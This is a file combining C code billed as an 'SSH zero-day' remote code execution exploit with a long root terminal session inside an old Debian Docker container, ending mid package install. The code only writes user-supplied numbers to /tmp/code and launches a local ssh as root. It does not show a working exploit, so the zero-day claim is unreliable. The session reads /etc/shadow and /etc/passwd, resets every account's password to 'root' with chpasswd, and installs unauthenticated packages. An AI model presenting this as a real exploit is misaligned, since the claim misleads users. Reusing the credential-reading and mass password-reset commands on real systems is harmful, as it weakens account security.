@@ -1,0 +1,1021 @@
+https://github.com/SleepTheGod/SSH-Remote-Code-Execution
+
+--------------------------------------------------------
+
+START EXPLOIT CODE
+
+--------------------------------------------------------
+
+/* Made by Taylor Newsome UwU Rarw X3 <3 */
+/* <Twitter.com/Clumsylulz> */
+/* Remote Code Execution Exploit for SSH */
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <string.h>
+/* Path to modified ssh */
+#define PATH_SSH "./ssh"
+int main(int argc, char *argv[])
+{
+int f;
+int port;
+unsigned long addr, *ptr;
+char *buffer, *aux, ch, *ssh;
+int i;
+if (argc < 8)
+{
+printf("\nUsage: %s <saved eip> <count> <packet length> <username length> <host> <port> <h(i)>\n\n", argv[0]);
+fflush(stdout);
+exit(0);
+}
+port = atoi(argv[6]);
+buffer = (char *) malloc(28);
+ptr = (unsigned long *) buffer;
+*(ptr++) = 1543007393 + strtoul(argv[1], 0, 10);
+*(ptr++) = 0;
+*(ptr++) = strtoul(argv[7], 0, 10);
+*(ptr++) = 0;
+*(ptr++) = 16520 + strtoul(argv[2], 0, 10);
+*(ptr++) = strtoul(argv[3], 0, 10);
+*(ptr++) = strtoul(argv[4], 0, 10);
+for (i = 0; i < 28; i += 4)
+{aux = buffer + i;
+ch = *aux;
+*aux = *(aux + 3);
+*(aux + 3) = ch;
+ch = *(aux + 1);
+*(aux + 1) = *(aux + 2);
+*(aux + 2) = ch;
+}
+printf("\nSaved Eip: &h + %u", 1543007393 + strtoul(argv[1], 0, 10));
+printf("\nReturn Address: 0x%lx", (16520 + strtoul(argv[2], 0, 10))/8);
+printf("\nPacket Length: %u", (strtoul(argv[3], 0, 10) + 8) & ~7);
+printf("\nUsername Length: %u\n\n", strtoul(argv[4], 0, 10));
+fflush(stdout);
+f = open("/tmp/code", O_RDWR | O_CREAT, S_IRWXU);
+write(f, buffer, 28);
+close(f);
+ssh = (char *) malloc(strlen(PATH_SSH) + 100 + strlen(argv[5]));
+strcpy(ssh, PATH_SSH);
+sprintf(ssh + strlen(PATH_SSH), " -p %i -v -l root %s", port, argv[5]);
+printf("%s\n", ssh);
+system(ssh);
+exit(0);
+}
+
+
+
+--------------------------------------------------------
+
+END OF EXPLOIT CODE THAT IS THE CODE I USED IN THIS POC
+
+--------------------------------------------------------
+
+
+root@vmi2865841:~/tools/SSH-Remote-Code-Execution# cat /etc/issue
+Debian GNU/Linux 12 \n \l
+
+root@vmi2865841:~/tools/SSH-Remote-Code-Execution# docker run -it --rm \
+>   -v /root/tools/SSH-Remote-Code-Execution:/poc \
+>   i386/debian:wheezy bash
+root@29bcb37807cf:/# cat /etc/issue
+Debian GNU/Linux 7 \n \l
+
+root@29bcb37807cf:/# cat /etc/shadow
+root:*:17955:0:99999:7:::
+daemon:*:17955:0:99999:7:::
+bin:*:17955:0:99999:7:::
+sys:*:17955:0:99999:7:::
+sync:*:17955:0:99999:7:::
+games:*:17955:0:99999:7:::
+man:*:17955:0:99999:7:::
+lp:*:17955:0:99999:7:::
+mail:*:17955:0:99999:7:::
+news:*:17955:0:99999:7:::
+uucp:*:17955:0:99999:7:::
+proxy:*:17955:0:99999:7:::
+www-data:*:17955:0:99999:7:::
+backup:*:17955:0:99999:7:::
+list:*:17955:0:99999:7:::
+irc:*:17955:0:99999:7:::
+gnats:*:17955:0:99999:7:::
+nobody:*:17955:0:99999:7:::
+libuuid:!:17955:0:99999:7:::
+root@29bcb37807cf:/# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+root@29bcb37807cf:/# ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: eth0@if11: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
+    link/ether 1e:13:2e:66:6f:69 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+root@29bcb37807cf:/# netstat -n
+bash: netstat: command not found
+root@29bcb37807cf:/# apt install ufw
+bash: apt: command not found
+root@29bcb37807cf:/# ufw
+bash: ufw: command not found
+root@29bcb37807cf:/# dig
+bash: dig: command not found
+root@29bcb37807cf:/# cd /bin/
+root@29bcb37807cf:/bin# ls
+bash   chmod  dash  df     dnsdomainname  egrep  findmnt  gzexe     ip     ls     mknod   mount       nisdomainname  ping6  readlink  run-parts  sh.distrib  stty  tailf     touch   uname       which         zcmp    zfgrep  zless
+cat    chown  date  dir    domainname     false  grep     gzip      ln     lsblk  mktemp  mountpoint  pidof          pwd    rm        sed        sleep       su    tar       true    uncompress  ypdomainname  zdiff   zforce  zmore
+chgrp  cp     dd    dmesg  echo           fgrep  gunzip   hostname  login  mkdir  more    mv          ping           rbash  rmdir     sh         ss          sync  tempfile  umount  vdir        zcat          zegrep  zgrep   znew
+root@29bcb37807cf:/bin# df -h
+Filesystem      Size  Used Avail Use% Mounted on
+overlay         1.4T  977G  346G  74% /
+tmpfs            64M     0   64M   0% /dev
+shm              64M     0   64M   0% /dev/shm
+/dev/sda1       1.4T  977G  346G  74% /poc
+/dev/sda1       1.4T  977G  346G  74% /etc/resolv.conf
+/dev/sda1       1.4T  977G  346G  74% /etc/hostname
+/dev/sda1       1.4T  977G  346G  74% /etc/hosts
+tmpfs            48G     0   48G   0% /proc/acpi
+tmpfs            64M     0   64M   0% /proc/interrupts
+tmpfs            64M     0   64M   0% /proc/kcore
+tmpfs            64M     0   64M   0% /proc/keys
+tmpfs            64M     0   64M   0% /proc/timer_list
+tmpfs            48G     0   48G   0% /sys/firmware
+root@29bcb37807cf:/bin# cat /proc/keys
+root@29bcb37807cf:/bin# cat /etc/resolv.conf
+# Generated by Docker Engine.
+# This file can be edited; Docker Engine will not make further changes once it
+# has been modified.
+
+nameserver 1.1.1.1
+nameserver 8.8.8.8
+nameserver 213.136.95.10
+nameserver 213.136.95.11
+search .
+
+# Based on host file: '/etc/resolv.conf' (legacy)
+# Overrides: []
+root@29bcb37807cf:/bin# cut -d: -f1 /etc/passwd | while read u; do printf '%s:root\n' "$u"; done | sudo chpasswd
+bash: sudo: command not found
+root@29bcb37807cf:/bin# cut -d: -f1 /etc/passwd | while read u; do printf '%s:root\n' "$u"; done | chpasswd
+root@29bcb37807cf:/bin# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+root@29bcb37807cf:/bin# aptitude
+bash: aptitude: command not found
+root@29bcb37807cf:/bin# ftp
+bash: ftp: command not found
+root@29bcb37807cf:/bin# ls
+bash   chmod  dash  df     dnsdomainname  egrep  findmnt  gzexe     ip     ls     mknod   mount       nisdomainname  ping6  readlink  run-parts  sh.distrib  stty  tailf     touch   uname       which         zcmp    zfgrep  zless
+cat    chown  date  dir    domainname     false  grep     gzip      ln     lsblk  mktemp  mountpoint  pidof          pwd    rm        sed        sleep       su    tar       true    uncompress  ypdomainname  zdiff   zforce  zmore
+chgrp  cp     dd    dmesg  echo           fgrep  gunzip   hostname  login  mkdir  more    mv          ping           rbash  rmdir     sh         ss          sync  tempfile  umount  vdir        zcat          zegrep  zgrep   znew
+root@29bcb37807cf:/bin# false
+root@29bcb37807cf:/bin# fgrep
+Usage: fgrep [OPTION]... PATTERN [FILE]...
+Try 'fgrep --help' for more information.
+root@29bcb37807cf:/bin# mount
+overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/JSZILXAM2W5WJUFED2A2ECQT5C:/var/lib/docker/overlay2/l/CJF3YAZDOI6XVZQU2XTOQIAGE6,upperdir=/var/lib/docker/overlay2/62f4d739148336cedad11a87ffe8d5616ab8bcbbeac96acd46b155e3e395ed12/diff,workdir=/var/lib/docker/overlay2/62f4d739148336cedad11a87ffe8d5616ab8bcbbeac96acd46b155e3e395ed12/work)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
+cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
+/dev/sda1 on /poc type ext4 (rw,relatime,discard,errors=remount-ro)
+/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro)
+/dev/sda1 on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
+/dev/sda1 on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro)
+devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
+proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
+tmpfs on /proc/acpi type tmpfs (ro,relatime,inode64)
+tmpfs on /proc/interrupts type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
+tmpfs on /sys/firmware type tmpfs (ro,relatime,inode64)
+root@29bcb37807cf:/bin# /sbin/ifconfig ppp0 | grep "inet addr:" | cut -f2 -d":" | cut -f1 -d" "
+bash: /sbin/ifconfig: No such file or directory
+root@29bcb37807cf:/bin# cat hostname
+ELF��4�14         (4�4�  TT�T���L'L'/���
+                                                                  /����hh�h�DDP�td�$����\\Q�tdR�td/����/lib/ld-linux.so.2GNUGNU��
+                                                                                                                                                                ��z�
+                                                                                                                                                                    f>#
+.'  )&/*%-#1                                                                                                                                            �U6��+�%2,(
+
+  $
+ �0yg���~�������ls�� �=Y=(��R��]D����K�libnsl.so.1__gmon_start___Jv_RegisterClassesyperr_stringyp_get_default_domainlibc.so.6_IO_stdin_used__printf_chkexitfopengai_strerroroptind__strdupgetdomainnameputs__stack_chk_failputcharreallocmemchrstrchrnulfgetsstrlengetaddrinfo__errno_locationgetnameinfosethostnamestdoutfclosemalloc__ctype_b_locoptargstderrgethostbynamegetopt_longfreeifaddrsgetifaddrs__fxstatfilenogethostnamefwritestrchrrindexhstrerror__?ii_���.��0��-�1���ii_mainsetdomainnamefreeGLIBC_2.0GLIBC_2.3.4GLIBC_2.1.1GLIBC_2.3GLIBC_2.4GLIBC_2.1 ii
+                                 ���� � $�
+(�
+  ,�
+4�8�<�@�D�H�L�P�T�X�\�`�d�h��p�t�x�|� ��!��"��#��$��%��&��'��)��*��+��,U��S���[���4��������t�J���X[���5���%���%�h������%��������h������%
+                                                                                                                                                             �h�����%�h �����%�h(�����%�h0�����%�h8�p����% �h@�`����%$�hH�P����%(�hP�@����%,�hX�0����%0�h`� ����%4�hh�����%8�hp�����%<�hx������%@�h�������%D�h�������%H�h�������%L�h������%P�h������%T�h������%X�h������%\�h��p����%`�h��`����%d�h��P����%h�h��@����%l�h��0����%p�h�� ����%t�h������%x�h������%|�h�������%��h������%��������%��h������%��h�����%��h �����%��h(�����%��h0�����%��h8�p����%��h@�`����%��hH�P����%��hP�@���U��WVS����0�U
+                                                                                                 ��D$/�$������t�X�
+                                                                                                                        ��g������D$,����8�t�D$w��$������D$,��uU1�1ۋU
+                                                                                                                                                                         �D$�D$
+                                                                                                                                                                                ���D���T$��$��������
+                                                                                                                                                                                                       ��?��:v����$�Zf��$�Ȣ�D$u��$�����D$,��t��D$���$�e�����҃��T$,�n����D$,�e����D$,�X����D$,�K����D$,�>����D$,�1�����'����D$,�����D���D$���$�����e�1�[^_]��D$, �������������D$���������$�d1҅�tY�t$�$�     ����tG��t�8u>�$������8��t�D$���$�D$(�[����T$(��u����
+�����9~3��������U
+                 ���$���������tQ�����9���~   �a�����t%�D$,�T$�T$(�$��T$(�$�����������T$,�$��������D$�$�J�����1�^����PTRhp�h��QVh ��'���������U��S���=�u?�����
+                                                                                                                                                                            �����9�s�������
+                                                                                                                                                                                                ��9�r�����[]Ít&��'U�������t���t  �$����Ð��������������,�D$�D$�$�i������D$��,É$�����D$H��$�D$
+                                                  �
+�������t��묅�u                                    ��D������$��������&UWV1�S1ۃ��������H�t&��$�t$�J�������tb�t$�$��������u�t�D$�$�N�����t�}$u$���Eu��$��
+����[^_]��D$�$������&��'UWV1�S1ۃ���������H�t&��$�t$��������tb�t$�$�x�������u�t�D$�$������t�}$u$���Eu��$��]�������t��묅�u
+����[^_]��D$�$�������&��'���D$ �D��D$�$(��D$
+                                                     �����$�����]�������'UW1�VS���\$0�$�k�������te�����(��DtT�D3��DtH��~;1����-tK��.uT�|�.tM��9�t����Dtڀ�-t%��.tڃ�9�u��t&����[^_]Í��|�.t�|.u���1�[��^_]Í�VS���D$ �\$$����������0��DF tf������u������D�����H��ɉ�x,�D��DF u��t&����DF t
+              �$����������$�A����$�D$�e�����tR�������uA�D$@��$����������w0�$�����$�D$�������t�[������t��t(��[^Ð����$�
+�������������UWVS����$�e��D$|1���      ��1��D$���� r��D$,�D$$������T$D�T$                                                           ����D$l��$�����D$P��$�����D$��$�o����
+                                                                              �T$$�T�D$�$��������\$D�{�D$.�<$��������{����f�u.��t*���$�?������t&�$�����K����$�#����v�D$|e3���Č[^_]Ít&����D$.�$��������$�����뼍t&�C����$�����멐������$����뙐���ҍD$H�׉$���a����������V�\$H�����l$N�v�C
+                                                  ������u}��tx���
+t��uk������
+�����������tH����1�|$�D$�D$�D$
+                                   .�l�T$�$�}�����t9��������f����$
+������D$H�$����������또�l�D$a��$�����붍���m������������^����t$Nf��D$�D$�D$�D$
+                                                                                          .�t�C�D$�C�$���������;\$Dt
+                                                                                                                        �$ �����t�D$^��$�P����[��u��$
+�������������WVS��p��$��D$e��$�s����������$������T$�T�$�D$����������|$D���<$�q�������tq�t�|$�$������t"�<#t0<�F���Ã�r����$�����D$^��$�D���������8�����$�N����D$^��$�D�����Q�����$�7����D$^��$�D�_����
+t,�D$
+�$�������t��4$������p��[^_Ít&�|$D��묍�&��$���t
+                                                 ��p1ۉ�[^_��D$�$����������U��]Ít&��'U��WVS�O��i%����������������)�����t$1��E�D�E
+                                                                                                                                        �D$��$��������9�rރ�[^_]Ë$Ð�U��S�������t��f����Ћ���u��[]Ð�U��S���[���$����Y[��%s: %s
+name too long%s%s rdnsdomainnameypdomainnamenisdomainname3.11hostname %s
+aAdfbF:h?iIsVvy(none)localhostdomainbootfilefqdnall-fqdnshelpshortversionverbosealiasip-addressall-ip-addressesnisypUsage: hostname [-v] [-b] {hostname|-F file}         set host name (from file)
+       hostname [-v] [-a|-A|-d|-f|-i|-I|-s|-y]       display formatted name
+       hostname [-v]                                 display host name
+
+       {yp,nis,}domainname [-v] {nisdomain|-F file}  set NIS domain name (from file)
+       {yp,nis,}domainname [-v]                      display NIS domain name
+
+       dnsdomainname [-v]                            display dns domain name
+
+       hostname -V|--version|-h|--help               print info and exit
+
+Program name:
+       {yp,nis,}domainname=hostname -y
+       dnsdomainname=hostname -d
+
+Program options:
+    -a, --alias            alias names
+    -A, --all-fqdns        all long host names (FQDNs)
+    -b, --boot             set default hostname if none available
+    -d, --domain           DNS domain name
+    -f, --fqdn, --long     long host name (FQDN)
+    -F, --file             read host name or NIS domain name from given file
+    -i, --ip-address       addresses for the host name
+    -I, --all-ip-addresses all addresses for the host
+    -s, --short            short host name
+    -y, --yp, --nis        NIS/YP domain name
+
+Description:
+   This command can get or set the host name or the NIS domain name. You can
+   also get the DNS domain or the FQDN (fully qualified domain name).
+   Unless you are using bind or NIS for host lookups you can change the
+   FQDN (Fully Qualified Domain Name) and the DNS domain name (which is
+  part of the FQDN) in the /etc/hosts file.
+ the specified hostname is invalidyou must be root to change the host nameyou must be root to change the domain name0�����`���������������Ɏ��ɎɎɎɎ��ɎɎ��ɎɎɎɎɎɎɎɎɎɎɎɎt�ɎɎɎɎɎɎɎɎɎɎg�]�ɎP�ɎC�Ɏ��6�ɎɎɎɎɎɎɎɎɎ)�ɎɎ��ɎɎ�ÛdʛbϛFԛfٛA�hY�f�s�V��v��a�i�I �y$�yX   
+����t`���X��������������p���4����H`�������������
+                                                      zR
+                                                             
+                                                              $����F
+                                                                        J
+                                                                         tx?;*2$"@���XC0_
+A
+  <\T�����A
+            �A�C�E0|
+C�A
+     ��A�A
+           <�������A
+                     �A�C�E0|
+C�A
+     ��A�A
+           �4���3C P�`�����A
+                              �C�A�C0z
+C�A
+     ��A�G
+           QC�C�
+                  AA�,D����A�A
+                                  �C �
+
+�A�B
+     <t�����A
+                 �A�A�F��
+A�A
+     ��A�E
+           H�������A
+                      �A�C��
+C
+  ��A�E
+        ^
+E�
+   AA�A
+N���e����B
+�A�A�A
+      �A
+          ��������S
+                      $�
+������o�d�D�
+I
+  �X̉��(���o����o���o���v���������Ƌ֋�����&�6�F�V�f�v���������ƌ֌�����&�6�F�V�f�v���������ƍ֍�����.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.text.fini.rodata.eh_frame_hdr.eh_frame.ctors.dtors.jcr.dynamic.got.got.plt.data.bss
+                                                               T�Th�h !���$8���d4���o�4>
+|$�$                                                                                                            D�D Fd�dIN���o��d[���o�     �j    ���    (s     ̉�     X
+      0w`�`
+              �� � �
+                         �
+                             �
+                              @�@    ����$\��%0���
+                                                                      �
+                                                                       ��/��/����/���/��������0P �0�
+root@29bcb37807cf:/bin# ls
+bash   chmod  dash  df     dnsdomainname  egrep  findmnt  gzexe     ip     ls     mknod   mount       nisdomainname  ping6  readlink  run-parts  sh.distrib  stty  tailf     touch   uname       which         zcmp    zfgrep  zless
+cat    chown  date  dir    domainname     false  grep     gzip      ln     lsblk  mktemp  mountpoint  pidof          pwd    rm        sed        sleep       su    tar       true    uncompress  ypdomainname  zdiff   zforce  zmore
+chgrp  cp     dd    dmesg  echo           fgrep  gunzip   hostname  login  mkdir  more    mv          ping           rbash  rmdir     sh         ss          sync  tempfile  umount  vdir        zcat          zegrep  zgrep   znew
+root@29bcb37807cf:/bin# uname -A
+uname: invalid option -- 'A'
+Try `uname --help' for more information.
+root@29bcb37807cf:/bin# uname -a
+Linux 29bcb37807cf 6.1.0-41-rt-amd64 #1 SMP PREEMPT_RT Debian 6.1.158-1 (2025-11-09) x86_64 GNU/Linux
+root@29bcb37807cf:/bin# ls /poc
+Exploit.c  Exploit.cpp  Exploit.out  LICENSE  README.md
+root@29bcb37807cf:/bin# ls /root/tools/SSH-Remote-Code-Execution
+ls: cannot access /root/tools/SSH-Remote-Code-Execution: No such file or directory
+root@29bcb37807cf:/bin# ls /poc
+Exploit.c  Exploit.cpp  Exploit.out  LICENSE  README.md
+root@29bcb37807cf:/bin# ./Exploit.out
+bash: ./Exploit.out: No such file or directory
+root@29bcb37807cf:/bin# ./Exploit.c
+bash: ./Exploit.c: No such file or directory
+root@29bcb37807cf:/bin# ls
+bash   chmod  dash  df     dnsdomainname  egrep  findmnt  gzexe     ip     ls     mknod   mount       nisdomainname  ping6  readlink  run-parts  sh.distrib  stty  tailf     touch   uname       which         zcmp    zfgrep  zless
+cat    chown  date  dir    domainname     false  grep     gzip      ln     lsblk  mktemp  mountpoint  pidof          pwd    rm        sed        sleep       su    tar       true    uncompress  ypdomainname  zdiff   zforce  zmore
+chgrp  cp     dd    dmesg  echo           fgrep  gunzip   hostname  login  mkdir  more    mv          ping           rbash  rmdir     sh         ss          sync  tempfile  umount  vdir        zcat          zegrep  zgrep   znew
+root@29bcb37807cf:/bin# cd
+root@29bcb37807cf:~# ls
+root@29bcb37807cf:~# ls /poc
+Exploit.c  Exploit.cpp  Exploit.out  LICENSE  README.md
+root@29bcb37807cf:~# cd /poc
+root@29bcb37807cf:/poc# ls
+Exploit.c  Exploit.cpp  Exploit.out  LICENSE  README.md
+root@29bcb37807cf:/poc# ./Exploit.out
+bash: ./Exploit.out: No such file or directory
+root@29bcb37807cf:/poc# clear
+root@29bcb37807cf:/poc# cat README.md
+| # SSH Remote Code Execution |
+| SSH Zero-Day | Made By ClumsyLulz | Taylor Christian Newsome |
+Summary:
+The code provided is a C program that receives input parameters and generates a packet to be sent to a server via the SSH protocol. The program creates a buffer to store data to be sent, and then writes it to a file. It then creates a command line string to execute an SSH connection to the specified host and port, using the "system" function.
+Issues:
+There are several issues with the code that have been identified:
+The program contains a buffer overflow vulnerability in the malloc function where only 28 bytes are allocated for the buffer, but 29 bytes are written to it. This can lead to memory corruption or a segmentation fault.
+The return address calculation is incorrect. The program is using the value of the packet length instead of the buffer size to determine the return address, resulting in an incorrect value.
+The format string in the printf statement for the return address is incorrect, resulting in an undefined behavior.
+The program does not check the return value of the "open" and "write" functions, which can lead to data loss or failure to write the buffer to the file.
+The program does not free the memory allocated for the "buffer" and "ssh" pointers, which can lead to memory leaks.
+The program uses the "system" function to execute the SSH command, which can lead to security vulnerabilities, as it allows arbitrary commands to be executed with elevated privileges.
+Recommendations:
+To address the issues outlined above, the following recommendations are proposed:
+Increase the size of the buffer allocation to 29 bytes to avoid buffer overflow issues.
+Correct the return address calculation by using the buffer size instead of the packet length.
+Correct the format string in the printf statement for the return address.
+Check the return values of the "open" and "write" functions, and handle errors appropriately.
+Free the memory allocated for the "buffer" and "ssh" pointers.
+Replace the "system" function with a safer alternative, such as "execvp", to avoid potential security vulnerabilities.
+It is recommended that these changes be made to the program to ensure its stability and security.
+root@29bcb37807cf:/poc# echo 'deb http://archive.debian.org/debian wheezy main' > /etc/apt/sources.list
+root@29bcb37807cf:/poc# apt-get -o Acquire::Check-Valid-Until=false update
+Get:1 http://archive.debian.org wheezy Release.gpg [2373 B]
+Get:2 http://archive.debian.org wheezy Release [191 kB]
+Ign http://archive.debian.org wheezy Release
+Get:3 http://archive.debian.org wheezy/main i386 Packages [7660 kB]
+Fetched 7854 kB in 1s (5452 kB/s)
+Reading package lists... Done
+W: GPG error: http://archive.debian.org wheezy Release: The following signatures were invalid: KEYEXPIRED 1587841717 KEYEXPIRED 1668891673 KEYEXPIRED 1557241909
+root@29bcb37807cf:/poc# apt-get install -y build-essential
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+Some packages could not be installed. This may mean that you have
+requested an impossible situation or if you are using the unstable
+distribution that some required packages have not yet been created
+or been moved out of Incoming.
+The following information may help to resolve the situation:
+
+The following packages have unmet dependencies:
+ build-essential : Depends: libc6-dev but it is not going to be installed or
+                            libc-dev
+                   Depends: g++ (>= 4:4.4.3) but it is not going to be installed
+                   Depends: dpkg-dev (>= 1.13.5) but it is not going to be installed
+E: Unable to correct problems, you have held broken packages.
+root@29bcb37807cf:/poc# make clean 2>/dev/null
+root@29bcb37807cf:/poc# make
+bash: make: command not found
+root@29bcb37807cf:/poc# apt install make
+bash: apt: command not found
+root@29bcb37807cf:/poc# wget http://archive.debian.org/debian/pool/main/a/apt/apt_0.9.7.9+deb7u7_i386.deb
+bash: wget: command not found
+root@29bcb37807cf:/poc# lsb_release -a 2>/dev/null || cat /etc/*release || uname -a
+PRETTY_NAME="Debian GNU/Linux 7 (wheezy)"
+NAME="Debian GNU/Linux"
+VERSION_ID="7"
+VERSION="7 (wheezy)"
+ID=debian
+ANSI_COLOR="1;31"
+HOME_URL="http://www.debian.org/"
+SUPPORT_URL="http://www.debian.org/support/"
+BUG_REPORT_URL="http://bugs.debian.org/"
+root@29bcb37807cf:/poc# which apt
+root@29bcb37807cf:/poc# which dpkg
+/usr/bin/dpkg
+root@29bcb37807cf:/poc# which gcc
+root@29bcb37807cf:/poc# which make
+root@29bcb37807cf:/poc# apt install build-essential -y
+bash: apt: command not found
+root@29bcb37807cf:/poc# apt-get update
+Get:1 http://archive.debian.org wheezy Release.gpg [2373 B]
+Hit http://archive.debian.org wheezy Release
+Ign http://archive.debian.org wheezy Release
+Hit http://archive.debian.org wheezy/main i386 Packages
+Fetched 2373 B in 1s (1975 B/s)
+Reading package lists... Done
+W: GPG error: http://archive.debian.org wheezy Release: The following signatures were invalid: KEYEXPIRED 1587841717 KEYEXPIRED 1668891673 KEYEXPIRED 1557241909
+root@29bcb37807cf:/poc# apt-get install -y net-tools dnsutils iproute2 sudo
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+E: Unable to locate package iproute2
+root@29bcb37807cf:/poc# echo "Clumsy" > /etc/hostname
+root@29bcb37807cf:/poc# apt-get update -y;
+Get:1 http://archive.debian.org wheezy Release.gpg [2373 B]
+Hit http://archive.debian.org wheezy Release
+Ign http://archive.debian.org wheezy Release
+Hit http://archive.debian.org wheezy/main i386 Packages
+Fetched 2373 B in 1s (2051 B/s)
+Reading package lists... Done
+W: GPG error: http://archive.debian.org wheezy Release: The following signatures were invalid: KEYEXPIRED 1587841717 KEYEXPIRED 1668891673 KEYEXPIRED 1557241909
+root@29bcb37807cf:/poc# deb http://archive.debian.org/debian/ wheezy main contrib non-free
+bash: deb: command not found
+root@29bcb37807cf:/poc# apt-get -o Acquire::Check-Valid-Until=false update
+Get:1 http://archive.debian.org wheezy Release.gpg [2373 B]
+Hit http://archive.debian.org wheezy Release
+Ign http://archive.debian.org wheezy Release
+Hit http://archive.debian.org wheezy/main i386 Packages
+Fetched 2373 B in 1s (2007 B/s)
+Reading package lists... Done
+W: GPG error: http://archive.debian.org wheezy Release: The following signatures were invalid: KEYEXPIRED 1587841717 KEYEXPIRED 1668891673 KEYEXPIRED 1557241909
+root@29bcb37807cf:/poc# apt-get install -y net-tools dnsutils iproute sudo
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+iproute is already the newest version.
+The following extra packages will be installed:
+  bind9-host geoip-database krb5-locales libbind9-80 libcap2 libdns88 libgeoip1 libgssapi-krb5-2 libisc84 libisccc80 libisccfg82 libk5crypto3 libkeyutils1 libkrb5-3 libkrb5support0 liblwres80 libxml2
+Suggested packages:
+  rblcheck geoip-bin krb5-doc krb5-user
+Recommended packages:
+  xml-core
+The following NEW packages will be installed:
+  bind9-host dnsutils geoip-database krb5-locales libbind9-80 libcap2 libdns88 libgeoip1 libgssapi-krb5-2 libisc84 libisccc80 libisccfg82 libk5crypto3 libkeyutils1 libkrb5-3 libkrb5support0 liblwres80 libxml2 net-tools sudo
+0 upgraded, 20 newly installed, 0 to remove and 0 not upgraded.
+Need to get 7266 kB of archives.
+After this operation, 15.8 MB of additional disk space will be used.
+WARNING: The following packages cannot be authenticated!
+  libcap2 libkeyutils1 libkrb5support0 libk5crypto3 libkrb5-3 libgssapi-krb5-2 libxml2 geoip-database net-tools libgeoip1 libisc84 libdns88 libisccc80 libisccfg82 libbind9-80 liblwres80 bind9-host dnsutils krb5-locales sudo
+E: There are problems and -y was used without --force-yes
+root@29bcb37807cf:/poc# apt-get -o Acquire::Check-Valid-Until=false --allow-unauthenticated install -y net-tools dnsutils iproute sudo
+Reading package lists... Done
+Building dependency tree
+Reading state information... Done
+iproute is already the newest version.
+The following extra packages will be installed:
